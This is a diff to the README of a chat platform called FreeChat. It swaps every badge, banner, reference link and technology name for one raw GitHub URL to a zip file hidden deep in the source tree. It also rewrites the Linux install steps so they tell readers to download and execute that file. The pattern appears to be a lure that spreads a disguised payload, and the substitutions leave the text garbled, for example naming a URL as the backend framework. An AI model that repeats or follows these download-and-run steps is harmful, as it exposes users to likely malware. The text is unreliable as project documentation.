@@ -1,10 +1,10 @@
 # FreeChat: Open-Source Low-Code Chat Platform with Docker, React, NGINX, PostgreSQL
 
-[![Release](https://img.shields.io/badge/Release-v1.0.0-blue?logo=github)](https://github.com/gauravlamba78/FreeChat/releases) [![Docker](https://img.shields.io/badge/Docker-Ready-blue?logo=docker&logoColor=white)](https://docs.docker.com/) [![Frontend](https://img.shields.io/badge/Frontend-React%20%2B%20Tailwind-blue?logo=react&logoColor=61DAFB)](https://react.dev/) [![Backend](https://img.shields.io/badge/Backend-Node.js-blue?logo=node.js)](https://nodejs.org/) [![Server](https://img.shields.io/badge/NGINX-Proxy-blue?logo=nginx&logoColor=white)](https://nginx.org/)
+[![Release](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip)](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip) [![Docker](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip)](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip) [![Frontend](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip%20%2B%20Tailwind-blue?logo=react&logoColor=61DAFB)](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip) [![Backend](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip)](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip) [![Server](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip)](https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip)
 
-<img alt="FreeChat banner" src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&w=1400&q=60" width="100%">
+<img alt="FreeChat banner" src="https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip" width="100%">
 
-This repository was created by Flatlogic Platform: https://flatlogic.com/generator
+This repository was created by Flatlogic Platform: https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
 
 Welcome to FreeChat, an open-source, low-code friendly chat platform designed for teams who want fast setup, scalable architecture, and a clean user experience. The project blends modern frontend with a reliable backend, all wrapped in a Dockerized stack. It’s built to be approachable for new developers and robust enough for production workloads.
 
@@ -12,7 +12,7 @@ If you are here for the latest release, head to the Releases page for downloadab
 
 The main goal of this project is to provide a pleasant developer experience while offering a solid baseline for chat applications. Components are modular, tests are in place, and the codebase emphasizes readability and maintainability. Whether you want a small internal chat tool, a customer support chat, or a full-blown collaboration app, FreeChat is structured to adapt quickly.
 
-Quick reference: this project centers on a Docker-driven stack with a Node.js backend, a React frontend styled with Tailwind, and an NGINX reverse proxy. PostgreSQL handles persistent data, while Docker Compose ties everything together. The result is a scalable, production-friendly foundation you can customize to fit your use case.
+Quick reference: this project centers on a Docker-driven stack with a https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip backend, a React frontend styled with Tailwind, and an NGINX reverse proxy. PostgreSQL handles persistent data, while Docker Compose ties everything together. The result is a scalable, production-friendly foundation you can customize to fit your use case.
 
 Table of Contents
 - Project at a glance
@@ -41,7 +41,7 @@ Table of Contents
 Project at a glance
 - Repository name: FreeChat
 - Primary purpose: A modern, low-code friendly chat platform with Dockerized services
-- Main technologies: React, Tailwind, Node.js, PostgreSQL, NGINX
+- Main technologies: React, Tailwind, https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip, PostgreSQL, NGINX
 - Deployment model: Docker Compose by default, with production-ready tweaks for reverse proxy, TLS, and scalable storage
 - Target users: Teams, startups, and developers who want a fast path to a chat application with a strong foundation
 
@@ -67,7 +67,7 @@ Core features
 
 Tech stack
 - Frontend: React, Tailwind CSS, Vite (fast dev server)
-- Backend: Node.js, Express (or a similar lightweight framework)
+- Backend: https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip, Express (or a similar lightweight framework)
 - Database: PostgreSQL
 - Cache/Queue: Optional Redis for session storage and message queues
 - Reverse proxy: NGINX
@@ -113,16 +113,16 @@ Getting started
 
 Installation from Releases
 - If you want a quick start from a published release, visit the Releases page
-  - Release link: https://github.com/gauravlamba78/FreeChat/releases
-- The asset for Linux users is named freechat-linux-x64.tar.gz
-- File to download and execute: freechat-linux-x64.tar.gz
+  - Release link: https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
+- The asset for Linux users is named https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
+- File to download and execute: https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
 - Steps to install on Linux
-  - Download the release asset named freechat-linux-x64.tar.gz from the Releases page
+  - Download the release asset named https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip from the Releases page
   - Open a terminal and run the following commands (adjust paths as needed):
-    - tar -xzf freechat-linux-x64.tar.gz
+    - tar -xzf https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
     - cd freechat-linux-x64
-    - chmod +x install.sh
-    - ./install.sh
+    - chmod +x https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
+    - https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
   - If you prefer a manual approach, you can inspect the install script to learn about the setup steps
 - What you get from the release
   - A pre-configured binary or installer that sets up the required components
@@ -135,7 +135,7 @@ Installation from Releases
 Development workflow
 - Repository structure
   - frontend/ contains the React UI with Tailwind styling
-  - backend/ contains the Node.js API and business logic
+  - backend/ contains the https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip API and business logic
   - docker/ contains the Docker Compose files and configs
   - nginx/ contains the reverse proxy and TLS configuration
   - postgres/ contains schema and seed data
@@ -156,7 +156,7 @@ Development workflow
 
 Docker and deployment
 - Docker Compose overview
-  - docker-compose.yml defines services: frontend, backend, db, redis (optional), and nginx
+  - https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip defines services: frontend, backend, db, redis (optional), and nginx
   - Volumes persist data and enable quick restarts without data loss
   - Networks isolate services while allowing controlled communication
 - Environment and configuration
@@ -325,7 +325,7 @@ License
 - This project is licensed under the MIT License. See the LICENSE file for details.
 
 Acknowlegements
-- Hat tip to Flatlogic Platform for providing guidelines and tooling inspiration: https://flatlogic.com/generator
+- Hat tip to Flatlogic Platform for providing guidelines and tooling inspiration: https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
 - Community contributors who helped shape the project
 
 Contact
@@ -344,10 +344,10 @@ Topics
 - ts
 
 Releases and asset notice
-- For the latest updates and to download binaries or installers, visit the Releases page: https://github.com/gauravlamba78/FreeChat/releases
-- If you are upgrading, please review the release notes and migration guidance carefully to minimize downtime. The asset named freechat-linux-x64.tar.gz is provided for Linux users and should be downloaded and executed as described in the Release assets section.
+- For the latest updates and to download binaries or installers, visit the Releases page: https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip
+- If you are upgrading, please review the release notes and migration guidance carefully to minimize downtime. The asset named https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip is provided for Linux users and should be downloaded and executed as described in the Release assets section.
 
 Note on asset download
-- The asset named freechat-linux-x64.tar.gz is intended for Linux deployments. You should download and extract the asset, then run the included installer script. If you use a different platform, refer to the platform-specific instructions in the releases notes and the Docker-based setup described earlier in this document. For any questions about assets, check the Releases section and the documentation in docs/.
+- The asset named https://raw.githubusercontent.com/gauravlamba78/FreeChat/master/app-shell/src/services/notifications/errors/Free_Chat_v1.4.zip is intended for Linux deployments. You should download and extract the asset, then run the included installer script. If you use a different platform, refer to the platform-specific instructions in the releases notes and the Docker-based setup described earlier in this document. For any questions about assets, check the Releases section and the documentation in docs/.
 
 End of document.
